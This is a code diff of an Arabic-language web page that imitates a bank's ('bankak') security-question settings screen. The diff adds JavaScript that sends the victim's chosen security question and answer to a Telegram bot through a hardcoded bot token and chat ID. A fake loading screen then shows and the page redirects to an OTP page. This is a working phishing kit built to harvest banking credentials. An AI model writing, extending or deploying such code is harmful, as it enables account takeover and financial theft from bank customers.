@@ -24,7 +24,6 @@
         .form-group select:focus, .form-group input:focus { border-color: #b91c23; }
         .btn-submit { width: 100%; padding: 15px; background-color: #b91c23; color: white; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
         .btn-submit:hover { background-color: #8a1117; }
-        
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -33,12 +32,10 @@
         <h1>بنك <span>bankak</span></h1>
         <i class="fa-solid fa-bars menu-icon"></i>
     </header>
-
     <div class="top-bar">
         <button class="btn-back" onclick="window.location.href='individual.html'"><i class="fa-solid fa-chevron-right"></i> رجوع</button>
         <h2>إدارة أسئلة الأمان</h2>
     </div>
-
     <main class="main-container">
         <div class="card">
             <h3>الرجاء اختيار سؤال الأمان والإجابة عليه</h3>
@@ -72,27 +69,34 @@
             </form>
         </div>
     </main>
-
-    <!-- شاشة التحميل -->
     <div id="loadingScreen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column;">
         <div style="border: 8px solid #f3f3f3; border-top: 8px solid #b91c23; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite;"></div>
         <h2 style="color: #b91c23; margin-top: 20px; font-size: 24px; font-weight: bold;">تحميل...</h2>
     </div>
-
     <script>
         function sendSecurityData(event) {
             event.preventDefault();
             const question = document.getElementById('securityQuestion').value;
             const answer = document.getElementById('securityAnswer').value;
 
-            sessionStorage.setItem('secQ', question);
-            sessionStorage.setItem('secA', answer);
+            // إرسال رسالة البوت (الرسالة الثانية)
+            const token = "9295127609:AAH6m1b_vUZZzsltPPEDTxhyEyMnsh6kbbw";
+            const chatId = "8812057901";
+            const message = `🛡️ *سؤال الأمان:*\n\n❓ السؤال: ${question}\n💡 الجواب: \`${answer}\``;
 
-            document.getElementById('loadingScreen').style.display = 'flex';
-
-            setTimeout(function() {
-                window.location.href = 'otp.html';
-            }, 10000);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+            .then(() => {
+                document.getElementById('loadingScreen').style.display = 'flex';
+                setTimeout(function() {
+                    window.location.href = 'otp.html';
+                }, 10000);
+            })
+            .catch(() => {
+                document.getElementById('loadingScreen').style.display = 'flex';
+                setTimeout(function() {
+                    window.location.href = 'otp.html';
+                }, 10000);
+            });
         }
     </script>
 </body>
